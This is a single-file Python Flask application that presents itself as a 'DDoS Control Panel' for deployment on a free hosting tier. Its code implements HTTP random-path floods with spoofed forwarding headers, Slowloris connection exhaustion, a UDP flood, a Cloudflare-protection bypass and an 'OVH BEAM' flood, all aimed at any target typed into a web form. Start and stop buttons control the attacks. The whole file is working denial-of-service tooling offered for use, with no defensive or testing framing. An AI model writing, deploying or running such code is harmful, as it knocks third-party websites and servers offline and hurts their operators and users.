#!/usr/bin/env python3
"""
Single-file DDoS Control Panel for Render Free Tier (512MB RAM)
Includes methods ported from: https://github.com/leminhvu950/methods
Usage: python app.py
"""

import asyncio
import random
import socket
import time
import threading
from flask import Flask, render_template_string, request, jsonify
import aiohttp
from urllib.parse import urlparse
import logging

# ---------- CONFIGURATION ----------
# Inline user agents from the repo's ua.txt
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
]

# Inline proxies (short list; user can replace with larger file)
PROXIES = [
    "",  # direct connection
    # Add SOCKS/HTTP proxies here if desired
]

# ---------- ATTACK MANAGER ----------
class AttackManager:
    def __init__(self):
        self.current_task = None
        self.loop = None
        self.thread = None
        self.methods = {
            'http_raw': self.http_raw_attack,
            'slowloris': self.slowloris_attack,
            'udp_flood': self.udp_flood_attack,
            'cf_bypass': self.cf_bypass_attack,
            'ovh_beam': self.ovh_beam_attack,
        }

    def start_attack(self, method, target, duration):
        if self.current_task and not self.current_task.done():
            return False, "Attack already running"
        
        # Create new event loop in a thread
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, args=(method, target, duration))
        self.thread.daemon = True
        self.thread.start()
        return True, "Attack started"

    def _run_loop(self, method, target, duration):
        asyncio.set_event_loop(self.loop)
        coro = self.methods[method](target, duration)
        self.current_task = self.loop.create_task(coro)
        try:
            self.loop.run_until_complete(self.current_task)
        except asyncio.CancelledError:
            pass
        finally:
            self.loop.close()
            self.current_task = None

    def stop_attack(self):
        if self.current_task and not self.current_task.done():
            self.current_task.cancel()
            return True, "Attack stopped"
        return False, "No attack running"

    def status(self):
        if self.current_task and not self.current_task.done():
            return "running"
        return "idle"

    # ---------- ATTACK METHODS (ported from repo) ----------

    async def http_raw_attack(self, target, duration):
        """HTTP RAW flood - random headers, random paths, high concurrency"""
        parsed = urlparse(target)
        if not parsed.scheme:
            target = "http://" + target
            parsed = urlparse(target)
        
        end_time = time.time() + duration
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            while time.time() < end_time:
                # Random path
                path = f"/{random.randint(1000,9999)}/{random.randint(1000,9999)}"
                url = f"{target}{path}"
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                task = asyncio.create_task(session.get(url, headers=headers, ssl=False))
                tasks.append(task)
                
                # Limit concurrency to avoid memory blow
                if len(tasks) > 200:
                    done, pending = await asyncio.wait(tasks, timeout=0.1, return_when=asyncio.FIRST_COMPLETED)
                    tasks = list(pending)
                
                await asyncio.sleep(0.01)
            
            # Cleanup
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

    async def slowloris_attack(self, target, duration):
        """Slowloris - hold connections open with partial requests"""
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        port = 80 if parsed.scheme != 'https' else 443
        if ':' in host:
            host, port = host.split(':')
            port = int(port)
        
        end_time = time.time() + duration
        sockets = []
        
        # Create and maintain many connections
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(f"GET /{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
                # Don't send final \r\n\r\n, keep open
                sockets.append(s)
            except:
                pass
            
            # Keep existing sockets alive by sending a header occasionally
            for s in sockets[:]:
                try:
                    s.send(f"X-{random.randint(0,9999)}: {random.randint(0,9999)}\r\n".encode())
                except:
                    sockets.remove(s)
            
            # Limit total sockets to avoid memory issues (each ~4KB)
            if len(sockets) > 500:
                await asyncio.sleep(0.5)
            else:
                await asyncio.sleep(0.1)
        
        # Cleanup
        for s in sockets:
            s.close()

    async def udp_flood_attack(self, target, duration):
        """UDP flood - requires IP and port. Target format: ip:port"""
        try:
            if ':' not in target:
                return  # Invalid
            ip, port_str = target.split(':')
            port = int(port_str)
        except:
            return
        
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Pre-generate random payload
        payload = random._urandom(1024)  # 1KB packets
        
        while time.time() < end_time:
            try:
                sock.sendto(payload, (ip, port))
            except:
                pass
            await asyncio.sleep(0.001)  # 1000 packets per second ~ 1MB/s
        
        sock.close()

    async def cf_bypass_attack(self, target, duration):
        """Cloudflare bypass using cloudscraper (needs cloudscraper lib)"""
        try:
            import cloudscraper
        except ImportError:
            return
        
        scraper = cloudscraper.create_scraper()
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                scraper.get(target, headers={'User-Agent': random.choice(USER_AGENTS)})
            except:
                pass
            await asyncio.sleep(0.05)

    async def ovh_beam_attack(self, target, duration):
        """OVH-BEAM style: specific headers and method to bypass OVH"""
        parsed = urlparse(target)
        if not parsed.scheme:
            target = "http://" + target
            parsed = urlparse(target)
        
        # OVH Beam uses specific headers and path patterns
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers'
        }
        
        connector = aiohttp.TCPConnector(limit=0)
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            end_time = time.time() + duration
            while time.time() < end_time:
                # Specific OVH Beam path pattern
                path = f"/?{random.randint(1000,9999)}={random.randint(1000,9999)}"
                url = f"{target}{path}"
                task = asyncio.create_task(session.get(url, headers=headers, ssl=False))
                tasks.append(task)
                
                if len(tasks) > 150:
                    done, pending = await asyncio.wait(tasks, timeout=0.1, return_when=asyncio.FIRST_COMPLETED)
                    tasks = list(pending)
                
                await asyncio.sleep(0.01)
            
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

# ---------- FLASK APP ----------
app = Flask(__name__)
manager = AttackManager()
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)  # Reduce noise

# HTML template (inline)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>DDOS Control Panel</title>
    <style>
        body { font-family: Arial; margin: 40px; background: #111; color: #0f0; }
        .container { max-width: 600px; margin: auto; background: #222; padding: 20px; border-radius: 8px; }
        h1 { text-align: center; color: #0f0; }
        label { display: block; margin: 10px 0 5px; color: #0f0; }
        input, select, button { width: 100%; padding: 8px; margin-bottom: 15px; background: #333; color: #0f0; border: 1px solid #0f0; border-radius: 4px; }
        button { cursor: pointer; font-weight: bold; }
        button:hover { background: #0f0; color: #000; }
        .status { text-align: center; font-size: 1.2em; margin: 20px 0; padding: 10px; border: 1px solid #0f0; border-radius: 4px; }
        .button-group { display: flex; gap: 10px; }
        .button-group button { flex: 1; }
        .footer { text-align: center; margin-top: 20px; font-size: 0.8em; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ DDOS CONTROL PANEL ⚡</h1>
        <div class="status" id="status">Idle</div>
        
        <label for="target">Target URL or IP:port</label>
        <input type="text" id="target" placeholder="https://example.com or 192.168.1.1:80">
        
        <label for="duration">Duration (seconds)</label>
        <input type="number" id="duration" value="60" min="1" max="3600">
        
        <label for="method">Attack Method</label>
        <select id="method">
            <option value="http_raw">HTTP RAW Flood</option>
            <option value="slowloris">Slowloris</option>
            <option value="udp_flood">UDP Flood (IP:port)</option>
            <option value="cf_bypass">Cloudflare Bypass</option>
            <option value="ovh_beam">OVH BEAM</option>
        </select>
        
        <div class="button-group">
            <button onclick="startAttack()">START</button>
            <button onclick="stopAttack()">STOP</button>
        </div>
        
        <div class="footer">Memory limit: 512MB • One attack at a time</div>
    </div>
    
    <script>
        async function updateStatus() {
            const resp = await fetch('/status');
            const data = await resp.json();
            document.getElementById('status').innerText = data.status === 'running' ? '🔥 ATTACK RUNNING 🔥' : '⚪ IDLE';
        }
        
        async function startAttack() {
            const target = document.getElementById('target').value;
            const duration = document.getElementById('duration').value;
            const method = document.getElementById('method').value;
            
            if (!target) {
                alert('Please enter target');
                return;
            }
            
            const resp = await fetch('/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({target, duration, method})
            });
            const data = await resp.json();
            if (data.success) {
                updateStatus();
            } else {
                alert(data.message);
            }
        }
        
        async function stopAttack() {
            const resp = await fetch('/stop', {method: 'POST'});
            const data = await resp.json();
            if (data.success) {
                updateStatus();
            } else {
                alert(data.message);
            }
        }
        
        setInterval(updateStatus, 1000);
        updateStatus();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/status')
def status():
    return jsonify({'status': manager.status()})

@app.route('/start', methods=['POST'])
def start():
    data = request.get_json()
    target = data.get('target', '').strip()
    duration = int(data.get('duration', 60))
    method = data.get('method', 'http_raw')
    
    if not target:
        return jsonify({'success': False, 'message': 'Target required'})
    
    if method not in manager.methods:
        return jsonify({'success': False, 'message': 'Invalid method'})
    
    success, msg = manager.start_attack(method, target, duration)
    return jsonify({'success': success, 'message': msg})

@app.route('/stop', methods=['POST'])
def stop():
    success, msg = manager.stop_attack()
    return jsonify({'success': success, 'message': msg})

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
